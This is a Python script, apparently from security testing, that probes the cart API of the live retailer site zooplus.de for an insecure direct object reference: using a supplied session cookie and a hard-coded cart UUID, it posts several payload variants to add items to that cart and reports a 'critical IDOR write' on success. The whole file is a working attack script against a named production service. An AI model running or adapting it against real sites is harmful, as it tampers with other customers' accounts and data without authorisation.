#!/usr/bin/env python3
"""
Test with different offerId formats and variations
"""

import requests
import json
import sys

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_write_variations.py <session_cookie>")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "X-Requested-With": "XMLHttpRequest"
}

# Get cart to see offerId format
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
cart = r.json()
before_count = len(cart.get("articles", []))
first_article = cart.get("articles", [{}])[0] if cart.get("articles") else {}
offer_id_str = first_article.get("offerId", "")  # "1P.2966095"
article_id = first_article.get("id")  # 2966095

print(f"[*] Testing with different offerId formats")
print(f"[+] Cart before: {before_count} items")
print(f"[+] OfferId from cart: {offer_id_str}")
print(f"[+] Article ID: {article_id}")
print()

# Try different formats
payloads = [
    {"offerId": article_id},  # Just number
    {"offerId": str(article_id)},  # String number
    {"offerId": offer_id_str},  # Full "1P.2966095"
    {"articleId": article_id, "quantity": 1},
    {"id": article_id, "quantity": 1},
    {"offerId": article_id, "quantity": 1},
    {"offerId": offer_id_str, "quantity": 1},
]

endpoint = f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles"

for i, payload in enumerate(payloads, 1):
    print(f"[*] Test {i}: POST {endpoint}")
    print(f"    Payload: {json.dumps(payload)}")
    try:
        r = requests.post(f"{BASE_URL}{endpoint}", headers=headers, json=payload, timeout=10)
        print(f"    HTTP {r.status_code}")
        
        if r.status_code in [200, 201]:
            print(f"    [!!!] SUCCESS!")
            print(f"    Response: {r.text[:500]}")
            
            # Verify
            import time
            time.sleep(1)
            r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
            if r2.status_code == 200:
                cart_after = r2.json()
                after_count = len(cart_after.get("articles", []))
                if after_count > before_count:
                    print(f"    [!!!] VERIFIED: {before_count} -> {after_count} items")
                    print()
                    print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
                    sys.exit(0)
        elif r.status_code == 400:
            print(f"    [!] Bad Request: {r.text[:200]}")
        elif r.status_code not in [404]:
            print(f"    Response: {r.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")

print()
print("[!] All tests returned 404 or errors")
print("[!] May need to test through browser with real session")

